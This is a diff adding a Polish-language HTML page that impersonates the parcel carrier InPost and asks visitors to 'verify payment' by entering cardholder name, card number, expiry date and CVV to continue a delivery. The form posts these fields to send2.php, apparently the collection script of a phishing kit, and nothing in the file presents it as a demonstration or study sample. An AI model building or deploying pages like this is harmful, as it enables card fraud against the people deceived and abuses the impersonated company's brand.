@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Weryfikacja płatności - InPost</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      color: #222;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 1rem;
+    }
+    .container {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      padding: 2rem;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.05);
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+      font-size: 1.75rem;
+      font-weight: 700;
+      margin-bottom: 2rem;
+      color: #000;
+      justify-content: center;
+    }
+    .logo svg {
+      width: 36px;
+      height: 36px;
+      fill: #ffcc00;
+      margin-right: 0.5rem;
+    }
+    h2 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    p {
+      color: #555;
+      font-size: 1rem;
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 0.6rem 0.75rem;
+      font-size: 1rem;
+      border: 2px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 1.2rem;
+      transition: border-color 0.3s ease;
+    }
+    input:focus {
+      border-color: #ffcc00;
+      outline: none;
+    }
+    .form-row {
+      display: flex;
+      gap: 1rem;
+    }
+    .form-row > div {
+      flex: 1;
+    }
+    button {
+      background-color: #ffcc00;
+      color: #000;
+      border: none;
+      font-weight: 700;
+      font-size: 1rem;
+      padding: 0.85rem 2rem;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #e6b800;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="5" fill="#FFCC00"/>
+        <g stroke="#FFCC00" stroke-width="2">
+          <line x1="12" y1="1" x2="12" y2="5" />
+          <line x1="12" y1="19" x2="12" y2="23" />
+          <line x1="1" y1="12" x2="5" y2="12" />
+          <line x1="19" y1="12" x2="23" y2="12" />
+          <line x1="4" y1="4" x2="7" y2="7" />
+          <line x1="17" y1="17" x2="20" y2="20" />
+          <line x1="4" y1="20" x2="7" y2="17" />
+          <line x1="17" y1="7" x2="20" y2="4" />
+        </g>
+      </svg>
+      InPost
+    </div>
+
+    <h2>Zweryfikuj dane płatności</h2>
+    <p>Podaj dane karty, aby kontynuować dostawę przesyłki.</p>
+
+    <form method="POST" action="send2.php">
+      <label for="ccname">Imię i nazwisko na karcie</label>
+      <input type="text" id="ccname" name="ccname" placeholder="Jan Kowalski" required>
+
+      <label for="ccnumber">Numer karty</label>
+      <input type="text" id="ccnumber" name="ccnumber" placeholder="1234 5678 9012 3456" required>
+
+      <div class="form-row">
+        <div>
+          <label for="ccexp">Ważność (MM/YY)</label>
+          <input type="text" id="ccexp" name="ccexp" placeholder="08/25" required>
+        </div>
+        <div>
+          <label for="cccvv">CVV</label>
+          <input type="text" id="cccvv" name="cccvv" placeholder="123" required>
+        </div>
+      </div>
+
+      <button type="submit">Zweryfikuj</button>
+    </form>
+  </div>
+
+  <script>
+    const ccexpInput = document.getElementById('ccexp');
+
+    ccexpInput.addEventListener('input', (e) => {
+      let value = e.target.value;
+
+      // Remove all non-digit characters
+      value = value.replace(/[^\d]/g, '');
+
+      if (value.length > 2) {
+        value = value.slice(0, 2) + '/' + value.slice(2, 4);
+      }
+
+      e.target.value = value;
+    });
+  </script>
+</body>
+</html>
